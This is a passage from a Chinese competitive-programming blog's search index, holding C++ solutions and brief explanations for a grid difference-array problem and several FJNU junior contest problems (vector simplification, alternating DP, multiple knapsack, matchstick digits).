class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">int</span> T,n,m,k;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; mp;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> r1,<span class="keyword">int</span> r2,<span class="keyword">int</span> c,<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line">    mp[r1][c]+=val;</div><div class="line">    mp[r2][c]-=val;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> t=<span class="number">1</span>;t&lt;=T;t++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;m,&amp;k);</div><div class="line">        mp=<span class="built_in">vector</span>&lt; <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt;(n+<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(m+<span class="number">2</span>,<span class="number">0</span>));</div><div class="line">        <span class="keyword">int</span> r=<span class="number">1</span>,c=<span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (k--) &#123;</div><div class="line">            <span class="keyword">char</span> d[<span class="number">2</span>];</div><div class="line">            <span class="keyword">int</span> s;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s%d"</span>,d,&amp;s);</div><div class="line">            <span class="keyword">if</span> (d[<span class="number">0</span>]==<span class="string">'U'</span>) &#123;</div><div class="line">                update(r-s,r,c,<span class="number">1</span>);</div><div class="line">                r-=s;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (d[<span class="number">0</span>]==<span class="string">'D'</span>) &#123;</div><div class="line">                update(r,r+s,c,<span class="number">-1</span>);</div><div class="line">                r+=s;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (d[<span class="number">0</span>]==<span class="string">'L'</span>) &#123;</div><div class="line">                c-=s;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                c+=s;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ll ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">                mp[i][j]=mp[i][j]+mp[i<span class="number">-1</span>][j]+mp[i][j<span class="number">-1</span>]-mp[i<span class="number">-1</span>][j<span class="number">-1</span>];</div><div class="line">                ans+=(ll)mp[i][j]*mp[i][j];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %lld\n"</span>,t,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>其实我们可以发现，不管考虑哪一侧都可以解决这个问题，当然因为最开始在左上角，维护左侧和上侧可能比较困难。下面放一个维护下侧的：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">int</span> T,n,m,k;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; mp;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> r,<span class="keyword">int</span> c1,<span class="keyword">int</span> c2,<span class="keyword">int</span> val)</span></span></div><div class="line">&#123;</div><div class="line">    mp[r][c1]+=val;</div><div class="line">    mp[r][c2]-=val;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> t=<span class="number">1</span>;t&lt;=T;t++) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;m,&amp;k);</div><div class="line">        mp=<span class="built_in">vector</span>&lt; <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt;(n+<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(m+<span class="number">2</span>,<span class="number">0</span>));</div><div class="line">        <span class="keyword">int</span> r=<span class="number">1</span>,c=<span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span> (k--) &#123;</div><div class="line">            <span class="keyword">char</span> d[<span class="number">2</span>];</div><div class="line">            <span class="keyword">int</span> s;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s%d"</span>,d,&amp;s);</div><div class="line">            <span class="keyword">if</span> (d[<span class="number">0</span>]==<span class="string">'L'</span>) &#123;</div><div class="line">                update(r,c-s,c,<span class="number">-1</span>);</div><div class="line">                c-=s;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (d[<span class="number">0</span>]==<span class="string">'R'</span>) &#123;</div><div class="line">                update(r,c,c+s,<span class="number">1</span>);</div><div class="line">                c+=s;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (d[<span class="number">0</span>]==<span class="string">'U'</span>) &#123;</div><div class="line">                r-=s;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                r+=s;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ll ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) &#123;</div><div class="line">                mp[i][j]=mp[i][j]+mp[i<span class="number">-1</span>][j]+mp[i][j<span class="number">-1</span>]-mp[i<span class="number">-1</span>][j<span class="number">-1</span>];</div><div class="line">                ans+=(ll)mp[i][j]*mp[i][j];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d: %lld\n"</span>,t,ans);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FJNU 低年级程序设计竞赛</title>
      <url>/blog/2016/12/05/FJNU%E4%BD%8E%E5%B9%B4%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AB%9E%E8%B5%9B/</url>
      <content type="html"><![CDATA[<h3 id="B-捧杯"><a href="#B-捧杯" class="headerlink" title="B-捧杯"></a><a href="http://acm.fjnu.edu.cn/problem.php?id=1195" target="_blank" rel="noopener">B-捧杯</a></h3><p>受力分析。。。贴这题主要是因为看到了向量化简有一个很简洁的作法~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (a==<span class="number">0</span>||b==<span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">return</span> max(a+b,<span class="number">1</span>);<span class="comment">//cool~</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (b) &#123;</div><div class="line">        <span class="keyword">int</span> t=b;</div><div class="line">        b=a%b;</div><div class="line">        a=t;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">spfy</span><span class="params">(<span class="keyword">int</span> &amp;a,<span class="keyword">int</span> &amp;b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> g=gcd(<span class="built_in">abs</span>(a),<span class="built_in">abs</span>(b));</div><div class="line">    a/=g;b/=g;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="keyword">int</span> x0,y0,n;</div><div class="line">        <span class="keyword">int</span> ansx=<span class="number">0</span>,ansy=<span class="number">0</span>;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x0,&amp;y0);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> x,y;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;x,&amp;y);</div><div class="line">            ansx+=x-x0;</div><div class="line">            ansy+=y-y0;</div><div class="line">        &#125;</div><div class="line">        spfy(ansx,ansy);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,ansx,ansy);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="C-汪老司机"><a href="#C-汪老司机" class="headerlink" title="C-汪老司机"></a><a href="http://acm.fjnu.edu.cn/problem.php?id=1196" target="_blank" rel="noopener">C-汪老司机</a></h3><p>交错dp。。。<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#include &lt;cstdio&gt;</div><div class="line">#include &lt;algorithm&gt;</div><div class="line">using namespace std;</div><div class="line"></div><div class="line">typedef long long ll;</div><div class="line">const int N=<span class="number">10010</span>;</div><div class="line">const ll INF=1LL&lt;&lt;<span class="number">60</span>;</div><div class="line">ll a<span class="string">[N]</span>,b<span class="string">[N]</span>;</div><div class="line">ll f<span class="string">[N]</span><span class="string">[20]</span>,g<span class="string">[N]</span><span class="string">[20]</span>;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    int T,n,k;</div><div class="line">    scanf(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    while (T--) &#123;</div><div class="line">        scanf(<span class="string">"%d%d"</span>,&amp;n,&amp;k);</div><div class="line">        for (int i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            scanf(<span class="string">"%lld"</span>,&amp;a<span class="string">[i]</span>);</div><div class="line">        &#125;</div><div class="line">        for (int i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            scanf(<span class="string">"%lld"</span>,&amp;b<span class="string">[i]</span>);</div><div class="line">        &#125;</div><div class="line">        for (int i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            f<span class="string">[i]</span><span class="string">[0]</span>=f<span class="string">[i-1]</span><span class="string">[0]</span>+a<span class="string">[i]</span>;</div><div class="line">            g<span class="string">[i]</span><span class="string">[0]</span>=g<span class="string">[i-1]</span><span class="string">[0]</span>+b<span class="string">[i]</span>;</div><div class="line">        &#125;</div><div class="line">        for (int j=<span class="number">1</span>;j&lt;=k;j++) &#123;</div><div class="line">            for (int i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">                f<span class="string">[i]</span><span class="string">[j]</span>=min(f<span class="string">[i-1]</span><span class="string">[j]</span>+a<span class="string">[i]</span>,g<span class="string">[i-1]</span><span class="string">[j-1]</span>+a<span class="string">[i]</span>);</div><div class="line">                g<span class="string">[i]</span><span class="string">[j]</span>=min(g<span class="string">[i-1]</span><span class="string">[j]</span>+b<span class="string">[i]</span>,f<span class="string">[i-1]</span><span class="string">[j-1]</span>+b<span class="string">[i]</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        printf(<span class="string">"%lld\n"</span>,min(f<span class="string">[n]</span><span class="string">[k]</span>,g<span class="string">[n]</span><span class="string">[k]</span>));</div><div class="line">    &#125;</div><div class="line">    return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="D-蒟蒻的任务分配"><a href="#D-蒟蒻的任务分配" class="headerlink" title="D-蒟蒻的任务分配"></a><a href="http://acm.fjnu.edu.cn/problem.php?id=1197" target="_blank" rel="noopener">D-蒟蒻的任务分配</a></h3><p>这题是比赛的时候唯一没什么想法的。先贴一下<del>通过某种py搞到的</del>出题人的题解：</p><blockquote><p>首先考虑到，没有可容性的事件一定是不能同时进行的，也就是说，最短也要花费这些事件长度的总和，如果这些事件长度的总和是大于有可容性的事件的长度的总和，那么最少耗费时间就是没有可容性事件的长度总和</p><p>首先因为最多同时开两件事，那么自然尽量把所有事分为尽量相等的两段，如果能够安排出合理的方案，那么该解一定是最优的。</p><p>接下来证明在这种条件下若分成尽量相等的两段，总能够安排出合理的序列使得任务能够正常进行</p><p>假设分为两段第一段里没有可容性的事件总长为x1,有可容性的事件的总长为y1。第二段里没有可容性的事件总长为x2,有可容性的事件的总长为y2。那么有x1+x2&lt;=y1+y2不妨设x1+y1&lt;=x2+y2那么有如下安排方案先做第一段里没有可容性的事件，同时开始做第二段里有可容性的事件如果y2 &lt; x1,那么根据x1+y1&lt;=x2+y2,一定有x2&gt;y1,那么有x1+x2&gt;y1+y2，与该情况相悖,所以y2&gt;=x1。那么在第一段没有可容性的事件全部做完后，开始做第一段有可容性的事件然后在第二段有可容性的事件全部做完后，开始做第二段没有可容性的事件随后任务肯定能够没有冲突的顺利进行，证毕。</p><p>接下来只需要把所有任务分为时间尽量相等的两半就可以了，这一部分可以背包暴力跑01背包时间复杂度是 $O(t*n^2*costi)$ 但是考虑到costi很小，可以记录costi相等的事件的数量，然后做二进制优化优化后的时间复杂度为 $O(t*cost^2*nlogn)$ </p><p>本题放过了暴力01背包的解法</p></blockquote><p>不得不说这个想法很巧妙，反正我肯定是想不到的。<br>虽然出题人说01背包能过但是我并没有过。。。于是我还是写了多重背包。。。<del>结果因为没清f[] WA了好几次。。。</del><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1005</span>;</div><div class="line"><span class="keyword">int</span> cnt[<span class="number">20</span>],f[N*<span class="number">10</span>],s[<span class="number">2</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T,n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">        s[<span class="number">0</span>]=s[<span class="number">1</span>]=<span class="number">0</span>;</div><div class="line">        <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</div><div class="line">        <span class="built_in">memset</span>(cnt,<span class="number">0</span>,<span class="keyword">sizeof</span>(cnt));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</div><div class="line">            <span class="keyword">int</span> ci,fi;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;ci,&amp;fi);</div><div class="line">            s[fi]+=ci;</div><div class="line">            cnt[ci]++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (s[<span class="number">0</span>]&gt;s[<span class="number">1</span>]) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,s[<span class="number">0</span>]);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        s[<span class="number">0</span>]+=s[<span class="number">1</span>];</div><div class="line">        <span class="keyword">int</span> lim=s[<span class="number">0</span>]/<span class="number">2</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=cnt[i];k&lt;&lt;=<span class="number">1</span>) &#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j=lim;j&gt;=k*i;j--) &#123;</div><div class="line">                    f[j]=max(f[j],f[j-k*i]+k*i);</div><div class="line">                &#125;</div><div class="line">                cnt[i]-=k;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=lim;j&gt;=cnt[i]*i;j--) &#123;</div><div class="line">                f[j]=max(f[j],f[j-cnt[i]*i]+cnt[i]*i);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,s[<span class="number">0</span>]-f[lim]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>还找到了一个理解起来难度可能小一点的方法：<a href="http://blog.csdn.net/bamboohiko/article/details/53448961#t3" target="_blank" rel="noopener">Problem D: 蒟蒻的任务分配</a> 自行查阅</p><h3 id="F-火柴棒"><a href="#F-火柴棒" class="headerlink" title="F-火柴棒"></a><a href="http://acm.fjnu.edu.cn/problem.php?id=1199" target="_blank" rel="noopener">F-火柴棒</a></h3><p>这题比赛的时候想的差不多了但是就是有一点没想到。。。<br>首先总火柴数是偶数的话肯定都是1。<br>总火柴数是奇数的话：</p><ol><li>如果其余拼成奇数个1，把中间一个1变成7即可</li><li>如果其余拼成偶数个1，把四个1和多余的1根变为三个7，放在首尾和中间；如果不到四个1，用两个1和多余的1根变为一个5，可以发现这时总火柴数一定是5。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> w[<span class="number">10</span>]=&#123;<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">6</span>&#125;;</div><div class="line"><span class="keyword">char</span> s[<span class="number">10010</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> T;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;T);</div><div class="line">    <span class="keyword">while</span> (T--) &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</div><div class="line">        <span class="keyword">int</span> l=<span class="built_in">strlen</span>(s),sts=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l;i++) &#123;</div><div class="line">            sts+=w[s[i]-<span class="string">'0'</span>];</div><div class="line">        &#125;</div><div class="line"><span class="comment">//        printf("%d\n",sts);</span></div><div class="line">        <span class="keyword">if</span> (sts%<span class="number">2</span>==<span class="number">0</span>) &#123;</div><div class="line">            <span class="keyword">int</span> k=sts/<span class="number">2</span>;</div><div class="line">            <span class="keyword">while</span> (k--) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'1'</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> k=sts/<span class="number">2</span>;</div><div class="line">        <span class="keyword">if</span> (k&amp;<span class="number">1</span>) &#123;</div><div class="line">            k/=<span class="number">2</span>;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'1'</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">putchar</span>(<span class="string">'7'</span>);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'1'</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">if</span> (sts==<span class="number">5</span>) &#123;</div><div class="line">                <span class="built_in">puts</span>(<span class="string">"5"</span>);</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            k=k/<span class="number">2</span><span class="number">-1</span>;</div><div class="line">            <span class="built_in">putchar</span>(<span class="string">'7'</span>);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;k;i++) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'1'</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">putchar</span>(<span class="string">'7'</span>);</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;k;i++) &#123;</div><div class="line">                <span class="built_in">putchar</span>(<span class="string">'1'</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="built_in">putchar</span>(<span class="string">'7'</span>);</div><div class="line">            <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="G-PY"><a href="#G-PY" class="headerlink" title="G-PY"></a><a href="http://acm.fjnu.edu.cn/problem.php?id=1200" target="_blank" rel="noopener">G-PY</a></h3><p>若有 $i &lt; j$，则 $F(i, j) = ai + ( aj + j ) - i$ ，倒着枚举 $i$ ，边更新最优的 $j$ 边更新答案即可。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div 